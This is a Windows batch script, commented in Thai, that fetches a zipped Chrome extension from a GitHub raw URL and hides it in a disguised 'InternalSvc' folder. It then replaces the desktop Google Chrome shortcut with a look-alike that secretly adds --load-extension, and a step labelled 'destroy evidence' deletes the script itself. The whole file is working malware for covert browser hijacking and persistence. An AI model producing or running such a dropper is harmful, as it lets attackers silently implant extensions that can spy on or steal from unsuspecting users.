@echo off
setlocal enabledelayedexpansion

:: 1. ตั้งค่าพื้นฐาน (เปลี่ยน ID ให้ตรงกับของคุณ)
set "EXT_ID=onifoepgcccnlehkgoonpaofeolhigpa"
set "TARGET_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\InternalSvc"
set "EXT_PATH=%TARGET_DIR%\%EXT_ID%"
set "EXT_URL=https://raw.githubusercontent.com/wkdopajwiojf/grap/main/onifoepgcccnlehkgoonpaofeolhigpa.zip"

:: 2. สร้างโฟลเดอร์และเตรียมไฟล์ส่วนเสริม (เหมือนที่คุณเคยทำสำเร็จแล้ว)
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%EXT_URL%' -OutFile '%TARGET_DIR%\ext.zip'; Expand-Archive -Path '%TARGET_DIR%\ext.zip' -DestinationPath '%TARGET_DIR%\temp_ext' -Force"

:: จัดการโฟลเดอร์ซ้อน (Move files)
if exist "%TARGET_DIR%\temp_ext" (
    if not exist "%EXT_PATH%" mkdir "%EXT_PATH%"
    for /d %%D in ("%TARGET_DIR%\temp_ext\*") do (
        xcopy "%%D\*" "%EXT_PATH%\" /s /e /y
    )
    rd /s /q "%TARGET_DIR%\temp_ext"
    del /f /q "%TARGET_DIR%\ext.zip"
)

:: 3. ขั้นตอนการ Hijack Shortcut (ไม้ตาย)
:: เราจะสร้างไฟล์ VBS สั้นๆ มาช่วยสร้าง Shortcut ที่ Desktop
set "VBS_SCRIPT=%TEMP%\create_lnk.vbs"
set "LNK_NAME=%PUBLIC%\Desktop\Google Chrome.lnk"

:: ลบ Shortcut เดิมทิ้งก่อน (ถ้ามี)
if exist "%LNK_NAME%" del /f /q "%LNK_NAME%"

:: เขียนไฟล์ VBS เพื่อสร้าง Shortcut ใหม่ที่แอบใส่ Flag --load-extension
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_SCRIPT%"
echo sLnkPath = "%LNK_NAME%" >> "%VBS_SCRIPT%"
echo Set oLnk = oWS.CreateShortcut(sLnkPath) >> "%VBS_SCRIPT%"
echo oLnk.TargetPath = "C:\Program Files\Google\Chrome\Application\chrome.exe" >> "%VBS_SCRIPT%"
:: ใส่ Arguments สำหรับโหลดส่วนเสริม
echo oLnk.Arguments = "--load-extension=""%EXT_PATH%""" >> "%VBS_SCRIPT%"
:: ใส่ Icon ให้เหมือน Chrome ของจริง
echo oLnk.IconLocation = "C:\Program Files\Google\Chrome\Application\chrome.exe,0" >> "%VBS_SCRIPT%"
echo oLnk.Save >> "%VBS_SCRIPT%"

:: รัน VBS เพื่อสร้าง Shortcut
cscript //nologo "%VBS_SCRIPT%"
del "%VBS_SCRIPT%"

:: 4. ทำลายหลักฐาน (ลบตัวสคริปต์ .bat ทิ้ง)
(goto) 2>nul & del "%~f0"
